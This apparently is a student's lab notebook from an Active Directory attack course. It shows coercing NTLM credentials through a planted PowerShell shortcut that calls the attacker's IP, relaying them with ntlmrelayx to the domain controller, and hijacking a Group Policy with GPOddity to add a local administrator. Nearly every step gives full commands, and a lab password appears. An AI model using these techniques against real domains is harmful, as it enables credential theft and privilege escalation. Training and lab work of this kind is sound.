1. Abuse an overly permissive Group Policy to add student555 to the local administrators froup on `dcorp-ci`.

We will use the link attack.


From Bloodhound we have seen that `DEVOPSADMIN` has generic permissions on `DEVOPS POLICY`
- We want to rely on the credentials of `DEVOPSADMIN`

In Addition `DEVOPS POLICY` affects the `dcorp-ci` computer.

So we have to put a shortcut (link) in the share that will trigger the user to send the credentials on the domain controller.

What the link will contain is:
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://<Our machine IP>' -UseDefaultCredentials"`
	- `ipconfig` to see it



So we first create the shortcut into `C:\AD\Tools\`
- New -> Shortcut -> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.55' -UseDefaultCredentials"`
- ![[Pasted image 20261119184623.png|354]]
- ![[Pasted image 20261119184723.png|357]]
- ![[Pasted image 20261119184735.png|367]]



## listener
Now we need to set a listener to get the credentials.
The tool is `ntlmrelayx.py`

And we can run it on cmd, choosing the ubutntu shell `wsl`:
- ![[Pasted image 20261119185251.png|578]]


So we run:
- `sudo ntlmrelayx.py -t ldaps://<Domain controller IP> -wh 172.16.100.55 --http-port '80,8080' -i --no-smb-server`


## Domain controller IP 

### Make the shell safe 
To make our work safe we can run:
- `. C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

### Run Powerview
- `. C:\AD\Tools\PowerView.ps1`

With PowerView we can get it:
- `Get-DomainController | select name,IPAddress`
	- ![[Pasted image 20261119185753.png|497]]


# Relaying
So we run:
- `sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.55 --http-port '80,8080' -i --no-smb-server`
	- ![[Pasted image 20261119185941.png|564]]
- The port 80 is in use so try `Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, OwningProcess`
	- ![[Pasted image 20261119191830.png]]
	- `Get-Process -Id 7052 | Select-Object Id, ProcessName, Path`
		- ![[Pasted image 20261119191906.png|580]]
	- We have to close hfs.
	- `Stop-Process -Id 7052 -Force`

Now re-run it
> Password for wsl: **WSLToTh3Rescue!** (See Lab Material)

> Firewall must be turn off

> Close hfs if open or other processes that use port 80
>  - `Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, OwningProcess`
>  - `Get-Process -Id <proc_id> | Select-Object Id, ProcessName, Path`
>  - `Stop-Process -Id <proc_ID> -Force`
>  OR TASK MANAGER AND CLOSE





# Where to put the link
We have seen with SMBHunt that `everyone` can write on the `AI` folder in `dcorp-ci.dollarcorp.moneycorp.local`:
- ![[Pasted image 20261119190234.png|503]]


So we put our link there:
- `copy "C:\AD\Tools\student555.lnk" "\\dcorp-ci\AI\"`
	- ![[Pasted image 20261119193246.png]]
- `cmd` is better because it says when the file is copied
- on `powershell` we have to do `Copy-Item -Path "C:\AD\Tools\student555.lnk" -Destination "\\dcorp-ci\AI\"`


# Got the connection 

So now we can use it:
- ![[Pasted image 20261119193401.png]]

So we have to connect in local to `127.0.0.1:11000`
- `nc 127.0.0.1 11000`
	- ![[Pasted image 20261119193557.png]]


# Add our student to the DevOPS GPO

At this point we need the `DevOPS GPO ` gplink:
- `Get-NetOU | select name, gplink`
	- ![[Pasted image 20261119193822.png]]

And use it to add our user into the policy:
- `write_gpo_dacl student555 {0BF8D01C-1F62-4BDC-958C-57140B67D147}`
	- ![[Pasted image 20261119194201.png]]

We can stop everything now.


# Cosa abbiamo fatto fino a qui
![[Pasted image 20261119194710.png|400]]

Ora possiamo modificare la GPO. Abbiamo i permessi di scrittura `GenericAll`.

# GPOddity
Now we need to create a new template for the GPO in order to add `student555` into the `Local Administrators` group.

So in a wsl temrinal we run:
- `cd /mnt/c/AD/Tools/GPOddity`
- `sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student555' --password 'zzzz' --command 'net localgroup administrators student555 /add' --rogue-smbserver-ip '172.16.100.55' --rogue-smbserver-share 'std555-gp' --dc-ip '172.16.2.1' --smb-mode none`
	- we want to run `net localgroup administrators student555 /add` using the new policy template
	- we need to create a share `std555-gp`
- ![[Pasted image 20261119195840.png]]


>The password ca be found on lab details
>![[Pasted image 20261119195638.png|453]]


### Create the share
We create the folder we used as share and put it on the share:
```
mkdir /mnt/c/AD/Tools/std555-gp
cp -r /mnt/c/AD/tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std555-gp
```
- `/mnt/c/AD/tools/GPOddity/GPT_Out/*` contains the template
- ![[Pasted image 20261119200448.png]]


Now we share it.


### Create the share
To create it we have to run cmd as admin:
- ![[Pasted image 20261119200224.png|637]]


Then we create the share:
```
net share std555-gp=C:\AD\Tools\std555-gp

icacls "C:\AD\Tools\std555-gp" /grant Everyone:F /T
```
- everyone can access it
- ![[Pasted image 20261119200541.png]]



Now we can see if the path of the Policy changed:
- `Get-DomainGPO -Identity 'DevOps POlicy'`
	- ![[Pasted image 20261119200759.png|581]]

Now we could have the access to dcorp-ci.


## Access to dcorp-ci
We can try:
- `winrs -r:dcorp-ci cmd /c "set computername && set username"`
- ![[Pasted image 20261119210228.png]]

It works.

